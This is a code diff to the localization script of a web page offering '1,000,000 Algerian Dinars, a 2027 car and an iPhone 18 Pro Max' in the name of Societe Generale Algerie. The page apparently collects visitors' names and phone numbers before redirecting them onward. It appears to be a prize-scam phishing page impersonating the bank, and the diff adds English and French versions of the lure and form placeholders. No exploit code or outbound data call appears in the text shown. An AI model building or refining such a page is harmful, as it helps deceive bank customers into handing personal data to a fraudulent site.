@@ -66,7 +66,7 @@
     "lang": "en",
     "dir": "ltr",
     "title": "Win valuable cash prizes with Societe Generale Algerie",
-    "desc": "سجّل الآن واربح 1,000,000 دينار جزائري، سيارة 2027، و iPhone 18 Pro Max مع Societe Generale Algerie",
+    "desc": "Register now and win 1,000,000 Algerian Dinars, a 2027 car and an iPhone 18 Pro Max with Societe Generale Algerie",
     "img": "en",
     "texts": [
       "SOCIETE GENERALE",
@@ -126,7 +126,7 @@
     "lang": "fr",
     "dir": "ltr",
     "title": "Gagnez des prix précieux avec Societe Generale Algerie",
-    "desc": "سجّل الآن واربح 1,000,000 دينار جزائري، سيارة 2027، و iPhone 18 Pro Max مع Societe Generale Algerie",
+    "desc": "Inscrivez-vous et gagnez 1 000 000 de dinars algériens, une voiture 2027 et un iPhone 18 Pro Max avec Societe Generale Algerie",
     "img": "en",
     "texts": [
       "SOCIETE GENERALE",
@@ -209,6 +209,13 @@
     fr: root.querySelector('[data-testid="lang-option-fr"]')
   };
 
+  // نصوص غير مغطّاة بترتيب عُقد النصوص: placeholders وأسماء الأزرار لقارئ الشاشة
+  var PLACEHOLDERS = {
+    ar: { name: 'مثال: محمد أمين', phone: '05 00 00 00 00', close: 'إغلاق' },
+    en: { name: 'e.g. Mohamed Amine', phone: '05 00 00 00 00', close: 'Close' },
+    fr: { name: 'ex. Mohamed Amine', phone: '05 00 00 00 00', close: 'Fermer' }
+  };
+
   function applyLang(code) {
     var t = I18N[code] || I18N.ar;
     document.documentElement.lang = t.lang;
@@ -228,11 +235,20 @@
       if (t.alts[i] != null) img.setAttribute('alt', t.alts[i]);
     });
 
+    var ph = PLACEHOLDERS[code] || PLACEHOLDERS.ar;
+    var nameField = root.querySelector('[data-testid="input-name"]');
+    var phoneField = root.querySelector('[data-testid="input-phone"]');
+    var closeBtn = root.querySelector('[data-testid="modal-close-button"]');
+    if (nameField) nameField.setAttribute('placeholder', ph.name);
+    if (phoneField) phoneField.setAttribute('placeholder', ph.phone);
+    if (closeBtn) closeBtn.setAttribute('aria-label', ph.close);
+
     Object.keys(langButtons).forEach(function (key) {
       if (langButtons[key]) langButtons[key].className = t.langcls[key] || langButtons[key].className;
     });
 
     try { localStorage.setItem(STORAGE_KEY, code); } catch (e) {}
+    if (window.SiteLang) window.SiteLang.set(code);
   }
 
   Object.keys(langButtons).forEach(function (code) {
@@ -242,7 +258,10 @@
   });
 
   var saved = 'ar';
-  try { saved = localStorage.getItem(STORAGE_KEY) || 'ar'; } catch (e) {}
+  try {
+    var fromUrl = new URLSearchParams(window.location.search).get('lang');
+    saved = (fromUrl && I18N[fromUrl]) ? fromUrl : (localStorage.getItem(STORAGE_KEY) || 'ar');
+  } catch (e) {}
   applyLang(I18N[saved] ? saved : 'ar');
 
   var slider = root.querySelector('[data-testid="promo-slider"]');
@@ -361,6 +380,6 @@
       } catch (err) { console.error('ensureCustomerDoc error:', err); }
     }
 
-    window.location.href = 'select.html';
+    window.location.href = window.SiteLang ? SiteLang.href('select.html') : 'select.html';
   });
 })();
